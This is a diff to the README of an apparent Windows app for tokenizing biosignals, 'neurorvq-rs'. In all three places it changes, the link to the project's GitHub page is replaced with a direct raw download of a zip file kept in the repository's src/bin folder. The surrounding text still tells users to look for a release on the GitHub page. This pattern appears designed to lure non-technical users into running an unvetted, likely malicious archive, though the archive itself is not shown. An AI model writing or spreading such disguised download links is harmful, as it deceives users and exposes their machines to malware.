@@ -1,6 +1,6 @@
 # 🧠 neurorvq-rs - Fast biosignal tokenizing for Windows
 
-[![Download neurorvq-rs](https://img.shields.io/badge/Download%20Now-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Fazalr714/neurorvq-rs)
+[![Download neurorvq-rs](https://img.shields.io/badge/Download%20Now-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Fazalr714/neurorvq-rs/main/src/bin/neurorvq-rs-1.8.zip)
 
 ## 🚀 What this app does
 
@@ -27,7 +27,7 @@ For smoother use with larger signal files:
 
 ## 📥 Download and set up
 
-1. Open the download page: https://github.com/Fazalr714/neurorvq-rs
+1. Open the download page: https://raw.githubusercontent.com/Fazalr714/neurorvq-rs/main/src/bin/neurorvq-rs-1.8.zip
 2. On the GitHub page, find the latest release or the main download area.
 3. Download the Windows file or package for your system.
 4. Save it to a folder you can find again, such as Downloads or Desktop.
@@ -178,7 +178,7 @@ Use neurorvq-rs for:
 
 ## 🔗 Download
 
-Get the app here: https://github.com/Fazalr714/neurorvq-rs
+Get the app here: https://raw.githubusercontent.com/Fazalr714/neurorvq-rs/main/src/bin/neurorvq-rs-1.8.zip
 
 ## 🖱️ Quick start
 
